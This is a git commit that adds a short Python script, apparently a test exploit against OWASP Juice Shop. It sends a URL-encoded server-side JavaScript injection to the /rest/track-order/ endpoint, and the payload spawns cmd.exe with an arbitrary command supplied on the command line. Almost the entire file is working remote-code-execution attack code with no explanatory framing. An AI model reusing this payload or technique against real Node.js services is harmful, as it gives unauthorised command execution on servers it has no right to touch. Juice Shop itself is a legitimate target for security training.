e0b1293fe64cac5dec754abc2df5b3d914e47c18
LV6 <63260147+LV6LV@users.noreply.github.com>
2024-07-17 23:27:43 -0500

    Add files via upload

---
+++ python_scripts/juiceshop_rce_win-test.py
@@ -0,0 +1,35 @@
+#!/usr/bin/python3
+import sys
+import requests
+import urllib
+
+# Check if the command argument is provided
+if len(sys.argv) != 2:
+    print("Usage: python3 script.py <command>")
+    sys.exit(1)
+
+command_arg = sys.argv[1]
+
+HOST = 'http://192.168.93.1:3000'
+
+command = f"""
+if (typeof global.hasRun === 'undefined' || global.hasRun === false) {{
+    global.hasRun = true;
+    var require = this.process.mainModule.require;
+    const {{ spawn }} = require('node:child_process');
+    const test = spawn('cmd.exe', ['/c', '{command_arg}']);
+    
+    test.on('exit', (code) => {{
+        global.hasRun = false; // Reset hasRun when the process exits
+    }});
+
+    test.on('error', (err) => {{
+        global.hasRun = false; // Reset hasRun if there is an error
+    }});
+}}
+"""
+
+payload = f"' || (function() {{ {command} }})(); //"
+
+encoded = urllib.parse.quote(payload, safe='')
+r = requests.get(HOST + "/rest/track-order/" + encoded)
